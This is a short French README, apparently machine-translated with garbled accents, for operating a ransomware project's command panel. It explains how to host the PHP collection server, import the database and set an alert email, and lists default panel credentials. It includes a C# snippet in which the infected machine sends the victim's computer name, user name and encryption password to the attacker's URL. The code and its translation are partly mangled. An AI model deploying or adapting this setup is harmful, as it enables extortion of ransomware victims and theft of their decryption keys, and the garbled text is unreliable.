Avertissement: dans cette vid�o, le panneau de l'attaquant n'a pas �t� affich� mais seulement la cl� enregistr�e dans le fichier pour que la vid�o dure moins.

Usage

Vous devez disposer d'un serveur Web qui prend en charge le langage de script php. Changez cette ligne avec votre URL. (Vous utilisez mieux la connexion Https pour �viter les �coutes)

Cha�ne targetURL = "https://www.example.com/Server/write.php";

Le nom d'utilisateur et le mot de passe par d�faut pour le webpanel (dans le fichier check.php) sont -> Nom d'utilisateur: test | Mot de passe: test

Importer la table sql dans votre base de donn�es en important le fichier: import.sql

D�finissez vos bases de donn�es dans le fichier: connect_db.php

Si vous voulez �galement �crire un fichier pour chaque ex�cution de virus, passez au fichier: write.php et faites un commentaire de la ligne 37 � 43. Pour la confidentialit� des informations, cela n'est pas recommand�
D�finissez votre adresse �lectronique pour obtenir des informations �galement par courrier �lectronique (n'�crivez pas votre adresse �lectronique PERSONNELLE) � la ligne 47 du fichier write.php
Le script devrait �crire le param�tre GET dans une base de donn�es et si vous voulez dans un fichier texte. Processus d'envoi en cours d'ex�cution dans la fonction SendPassword ()

      String info = "? Computer_name =" + computerName + "& userName =" + userName + "& password =" + password + "& allow = ransom";
      Var fullUrl = targetURL + info;
      Var conent = new System.Net.WebClient (). DownloadString (fullUrl);